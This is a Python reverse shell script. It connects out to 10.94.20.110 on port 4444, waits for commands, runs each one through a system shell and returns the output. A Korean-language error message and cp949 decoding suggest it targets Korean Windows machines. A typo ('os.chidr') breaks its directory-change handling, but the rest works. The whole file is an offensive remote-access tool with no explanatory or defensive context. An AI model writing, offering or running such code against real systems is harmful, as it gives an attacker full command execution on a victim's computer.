import socket
import subprocess
import os

HOST = "10.94.20.110"
BUF = 4096 

host = HOST
port = 4444

s = socket.socket()

s.connect((host,port))

def run_command(command):
    if command[:2] == 'cd':
        os.chidr(command[3:])

    if len(command) > 0:
        try:
            cmd = subprocess.Popen(command, shell=True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
            output_bytes = cmd.stdout.read()+cmd.stderr.read()
            output_str = str(output_bytes, "cp949")
            return output_str + str(os.getcwd()) + ">"
        except:
            output_str = "명령어 실행 안됨\n"
            return output_str

while True :
    x = s.recv(BUF).decode('utf-8')
    print(x)
    x = run_command(x)
    s.send(str.encode(x))
    
s.close()
